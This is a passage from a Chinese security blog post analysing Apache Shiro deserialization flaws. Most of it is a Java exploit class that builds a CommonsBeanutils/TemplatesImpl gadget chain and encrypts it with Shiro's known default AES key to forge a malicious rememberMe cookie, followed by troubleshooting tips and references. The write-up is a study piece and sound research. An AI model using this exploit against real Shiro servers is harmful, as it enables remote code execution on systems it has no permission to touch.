</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">expShiro</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//取当前目录下的类路径EvilTemplatesImpl.class.getName()，如果在当前目录下可以直接写类名即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilTemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">()</span>
</span></span><span class="line"><span class="cl">        <span class="o">});</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">BeanComparator</span> <span class="n">beanComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="n">beanComparator</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">beanComparator</span><span class="o">,</span><span class="s">&#34;property&#34;</span><span class="o">,</span><span class="s">&#34;outputProperties&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span><span class="s">&#34;queue&#34;</span><span class="o">,</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">obj</span><span class="o">,</span><span class="n">obj</span><span class="o">});</span>
</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;size&#34;</span><span class="o">,</span> <span class="n">2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">aClass</span> <span class="o">=</span> <span class="n">priorityQueue</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Method</span> <span class="n">heapify</span> <span class="o">=</span> <span class="n">aClass</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;heapify&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">heapify</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">AesCipherService</span> <span class="n">aes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AesCipherService</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ByteSource</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="na">encrypt</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>我们将生成的cookie进行利用：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231216002829347.png" alt="image-20231216002829347"></p>
<p>最后这里说下，其实如果shiro的commons.beanutils版本跟我们的生成利用链的commons.beanutils不一致会出现以下错误：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc
</span></span><span class="line"><span class="cl">serialVersionUID = -2044202215314119608, local class serialVersionUID =
</span></span><span class="line"><span class="cl">-3490850999041592962
</span></span></code></pre></div><p>因为我的利用文件是跟shiro同一个项目的所以不会出现这个问题，解决办法就是用跟shiro同一个版本的commons.beanutils。</p>
<h2 id="0x04-总结">0x04 总结</h2>
<p>写到Shiro Padding Oracle Attack部分的时候卡了大概两天，中途也想过放弃，但是我就是有强迫症，没弄懂的一定要弄懂，不然前面的时间都浪费了。</p>
<p>希望大家学习到比较复杂的漏洞利用的时候可以耐心去学，要是真的学不下就去打几把游戏，但是一定要弄懂～</p>
<h2 id="0x05-参考">0x05 参考</h2>
<p><a href="https://blog.csdn.net/qq_47886905/article/details/123479769">https://blog.csdn.net/qq_47886905/article/details/123479769</a></p>
<p><a href="https://paper.seebug.org/1782/">https://paper.seebug.org/1782/</a></p>
<p>《Java安全漫谈 - 15.TemplatesImpl在Shiro中的利用》</p>
<p>《Java安全漫谈 - 17.CommonsBeanutils与无commons-collections的Shiro反序列化利用》</p>
<p><a href="https://xz.aliyun.com/t/7207">https://xz.aliyun.com/t/7207</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzkwOTIxNzQ5OA==&amp;mid=2247483808&amp;idx=1&amp;sn=04acf67bd3d0c035cd45565b601cc3b9">shiro721 Padding Oracle Attack详细分析（一）</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzkwOTIxNzQ5OA==&amp;mid=2247483823&amp;idx=1&amp;sn=31a0ae23d994e76e18e7121bd8c476ac&amp;chksm=c13f5a1af648d30cf560bc0ea232c9b33f0f75efdea39bd231d12373c8ea97d1b17b31253661&amp;cur_album_id=1758967818013704200&amp;scene=189#wechat_redirect">shiro721 Padding Oracle Attack详细分析（二）</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2045288">带你了解CBC加密解密</a></p>
<p><a href="https://buaq.net/go-35066.html">我所理解的Padding Oracle Attack和CBC字节翻转</a></p>


            <hr class="bg-gray-300 mt-8">

            

            
<div class="border-l-4 border-red-400 mx-auto text-gray-500">
    <div class="copyright">
        <ul class="list-none">
            <li>
                <strong>原文作者：</strong>
                <a rel="author" href="https://xxe.icu">F0rmat</a>
            </li>
            <li style="word-break:break-all">
                <strong>原文链接：</strong>
                <a href="https://xxe.icu/shiro_deserialization_vulnerability.html">https://xxe.icu/shiro_deserialization_vulnerability.html</a>
            </li>
            <li>
                <strong>版权声明：</strong>本作品采用
                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
            </li>
        </ul>
    </div>
 
</div>


        </div>

        
        

         
        

    </div>
    

    
    <hr class="bg-gray-300 dark:bg-gray-300 my-10">

    
        
        
        <div class="comments">
            

  

  
    <script src="https://utteranc.es/client.js"
            repo="Secd0g/comment"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

  
        </div>

        <div class="related my-5">
            


<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
    
    <li><a href="/commonsbeanutils1_chain_analysis.html" class="underline text-yellow-600">Java代码审计-CommonsBeanUtils1链分析</a></li>
    
    <li><a href="/commonscollections2_chain_analysis.html" class="underline text-yellow-600">Java代码审计-CommonsCollections2链分析</a></li>
    
    <li><a href="/commonscollections3_chain_analysis.html" class="underline text-yellow-600">Java代码审计-CommonsCollections3链分析</a></li>
    
    <li><a href="/commonscollections6_chain_analysis.html" class="underline text-yellow-600">Java代码审计-CommonsCollections6链分析</a></li>
    
    <li><a href="/install-parallels-tools-on-kali-linux-2023.3.html" class="underline text-yellow-600">Kali Linux 2023.3安装Parallels Tools</a></li>
    
</div>

        </div>

    

</section>


<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">

    <div class="lg:w-full mx-auto items-center justify-between">
    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
        
        <div class="p-4">
            <p class="text-2xl text-center pb-2">F0rmat</p>
            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
        </div>
        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
            <div class="flex-1 border-r border-gray-600">
                <p class="text-center">
                    <span class="font-bold ">
                        94
                    </span>
                    文章
                </p>
            </div>
            <div class="flex-1 text-center">
                <p class="text-center">
                    <span class="font-bold">
                        
                            60
                        
                    </span>
                    标签
                </p>
            </div>
        </div>
        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
                
                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
                

                

                

                

                

                

                

                

                

                

                

                

                

                

                

                

                
                
                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
                

                

                

                

                

                

                
                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
                
            </div>
        </div>
    </div>
</div>










    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
            
<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
    <div class="sticky text-sm" style="top:6em;" id="menu-content">
        <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#0x00-前言">0x00 前言</a></li>
        <li><a href="#0x01-shiro-550分析">0x01 Shiro-550分析</a>
          <ul>
            <li><a href="#环境">环境</a></li>
            <li><a href="#加密过程">加密过程</a></li>
            <li><a href="#解密过程">解密过程</a></li>
            <li><a href="#漏洞利用">漏洞利用</a></li>
          </ul>
        </li>
        <li><a href="#0x02-shiro-721分析">0x02 Shiro-721分析</a>
          <ul>
            <li><a href="#环境-1">环境</a></li>
            <li><a href="#cbc加密模式分析">CBC加密模式分析</a>
              <ul>
                <li><a href="#一组加密">一组加密</a></li>
                <li><a href="#多组加密">多组加密</a></li>
              </ul>
            </li>
            <li><a href="#shiro-padding-oracle-attack">Shiro Padding Oracle Attack</a></li>
          </ul>
        </li>
        <li><a href="#0x03-无利用链的shiro反序列化利用">0x03 无利用链的Shiro反序列化利用</a></li>
        <li><a href="#0x04-总结">0x04 总结</a></li>
        <li><a href="#0x05-参考">0x05 参考</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>

        </div>
    </div>
   
</div> 

    </div>
    
    
<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
    <div class="container  mx-auto flex py-8">
        <div class="w-full text-center text-gray-600 dark:text-gray-400">
            <p>
                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
            </p>
            
            <p class="pt-1">
                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
            </p>

            

        </div>

    </div>
    
   
    
<script src="/js/clipboard.min.js"></script>
   

</footer>

 <script>
  window.onload = function() {
    document.getElementById("nav-toggle").onclick = function() {
      document.getElementById("nav-content").classList.toggle("hidden");
    };

    var donate = document.getElementById("btn-donate");
    if (donate) {
      donate.onclick = function() {
        document.getElementById("donate-image").classList.remove("hidden");
        donate.classList.add("hidden");
      };
    }

    var hostname = window.location.hostname;
    var divs = document.querySelectorAll('a[href^="http"]');
    [].forEach.call(divs, function(div) {
      url = div.getAttribute("href");
      var domain = url
        .replace("http://", "")
        .replace("https://", "")
        .split(/[/?#:]/)[0];
      if (domain !== hostname) {
        div.setAttribute("target", "_blank");
      }
    });
  };

   
  
  var h = document.documentElement,
    b = document.body,
    st = "scrollTop",
    sh = "scrollHeight",
    progress = document.querySelector("#progress"),
    scroll;
  var scrollpos = window.scrollY;
  var header = document.getElementById("header");
  var navcontent = document.getElementById("nav-content");

  document.addEventListener("scroll", function() {
     
    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
    progress.style.setProperty("--scroll", scroll + "%");

     
    scrollpos = window.scrollY;

    if (scrollpos > 10) {
      navcontent.classList.remove("bg-gray-100");
    } else {
      navcontent.classList.add("bg-gray-100");
    }
  });

  
  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
      var lightIcon = document.getElementById("light-icon");
      var darkIcon = document.getElementById("dark-icon"); 
      lightIcon.classList.add("hidden");
      darkIcon.classList.remove("hidden");
      document.querySelector('html').classList.add('dark')
  }

  document.getElementById('switchTheme').addEventListener('click', function() {
    let htmlClasses = document.querySelector('html').classList;
    var lightIcon = document.getElementById("light-icon");
    var darkIcon = document.getElementById("dark-icon");
    if(localStorage.theme == 'dark') {
        htmlClasses.remove('dark');
        localStorage.removeItem('theme');
        darkIcon.classList.add("hidden");
        lightIcon.classList.remove("hidden");
    } else {
        htmlClasses.add('dark');
        lightIcon.classList.add("hidden");
        darkIcon.classList.remove("hidden");
        localStorage.theme = 'dark';
    }
  });
</script>

</body>

</html>